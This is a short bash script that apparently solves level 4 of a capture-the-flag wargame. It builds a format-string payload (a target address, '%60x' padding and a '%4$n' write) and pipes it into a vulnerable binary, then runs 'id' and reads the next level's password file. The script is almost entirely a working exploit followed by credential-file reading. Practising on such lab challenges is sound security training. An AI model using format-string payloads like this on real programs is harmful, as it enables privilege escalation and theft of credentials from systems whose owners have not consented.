#!/bin/bash

GETPASS="cat /home/user/level5/.pass"

set -x

WRITE_ADDRESS="\x8c\x98\x04\x08"
PADDING="%60x"
WRITE_MODIFIER='%4$n'

python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit4

(cat /tmp/exploit4 - | ~/level4) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI